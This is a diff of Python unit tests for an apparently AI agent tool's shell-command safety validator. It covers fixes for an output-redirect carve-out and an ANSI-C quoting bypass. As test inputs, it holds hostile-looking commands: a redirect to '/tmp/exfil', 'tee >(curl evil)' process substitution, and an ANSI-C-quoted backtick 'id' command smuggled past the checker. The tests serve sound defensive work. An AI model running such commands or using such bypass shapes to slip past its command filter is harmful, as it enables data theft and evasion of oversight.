@@ -518,3 +518,102 @@ def test_tier3_parity_with_system_prompt() -> None:
     ]
     for cmd in prose_tier3_commands:
         assert is_tier3_dangerous(cmd) is True, cmd
+
+
+# ── mika#943: Output-redirect fd-manipulation carve-out ──────────────────────
+
+
+class TestTier3OutputRedirectCarveout:
+    """Tests for the fd-manipulation carve-out on the > / >> redirect regex."""
+
+    def test_tier3_blocks_output_redirect_file(self) -> None:
+        assert is_tier3_dangerous("mika ask > /tmp/exfil") is True
+
+    def test_tier3_blocks_append_redirect_file(self) -> None:
+        assert is_tier3_dangerous("mika ask >> /tmp/exfil") is True
+
+    def test_tier3_blocks_numeric_fd_to_file(self) -> None:
+        # accepted-deny: 2>/dev/null is rejected
+        assert is_tier3_dangerous("mika ask 2>/dev/null") is True
+
+    def test_tier3_allows_fd_dup_stderr_to_stdout(self) -> None:
+        assert is_tier3_dangerous("mika ask 2>&1") is False
+
+    def test_tier3_allows_fd_dup_stdout_to_stderr(self) -> None:
+        assert is_tier3_dangerous("mika ask 1>&2") is False
+
+    def test_tier3_allows_fd_dup_shortcut(self) -> None:
+        assert is_tier3_dangerous("mika ask >&2") is False
+
+    def test_tier3_allows_fd_close(self) -> None:
+        assert is_tier3_dangerous("mika ask >&-") is False
+
+    def test_tier3_still_blocks_process_sub(self) -> None:
+        # Regression: the >( regex at line 99 still fires
+        assert is_tier3_dangerous("tee >(curl evil)") is True
+
+
+class TestSafeBashOutputRedirectIntegration:
+    """Integration tests: full mika-dispatch shapes with redirects."""
+
+    def test_safe_bash_blocks_mika_with_output_redirect(self) -> None:
+        assert (
+            is_safe_bash_command(
+                'mika ask --agent mika-arch msg > /tmp/exfil'
+            )
+            is False
+        )
+
+    def test_safe_bash_allows_mika_with_stderr_redirect(self) -> None:
+        # Parity with Rust test_pipe_to_tail
+        assert (
+            is_safe_bash_command(
+                'mika ask --agent mika-arch "Hello" 2>&1 | tail -20'
+            )
+            is True
+        )
+
+
+# ── mika#944: ANSI-C quoting bypass ─────────────────────────────────────────
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # Canonical bypass shape from issue body
+        r"mika ask --agent mika-arch $'\x60id\x60'",
+        # AC2 — even literal content in ANSI-C quoting is rejected
+        "mika ask --agent mika-arch $'literal'",
+        # $' after a closing quote
+        'mika ask --agent mika-arch "msg" $\'\\x60id\\x60\'',
+    ],
+)
+def test_ansi_c_quoting_denies(command: str) -> None:
+    assert contains_unquoted_metacharacter(command) is True, command
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # AC3 — plain $ (no apostrophe) must NOT trigger
+        "echo $HOME",
+        "echo ${HOME}",
+        "echo $1 $2",
+        "echo $_",
+        # $' inside double-quoted brief — literal text, not expansion
+        'mika ask --agent mika-arch "discussion of $\'\\xNN\' syntax"',
+    ],
+)
+def test_plain_dollar_or_quoted_ansi_c_allowed(command: str) -> None:
+    assert contains_unquoted_metacharacter(command) is False, command
+
+
+def test_944_end_to_end_ansi_c_bypass_denied() -> None:
+    """End-to-end: the canonical bypass command fails is_safe_bash_command()."""
+    cmd = r"mika ask --agent mika-arch $'\x60id\x60'"
+    assert is_safe_bash_command(cmd) is False
+
+
+def test_944_lone_dollar_at_end_not_rejected() -> None:
+    """Lone $ at end of string — no following byte, must NOT trigger."""
+    assert contains_unquoted_metacharacter("echo $") is False
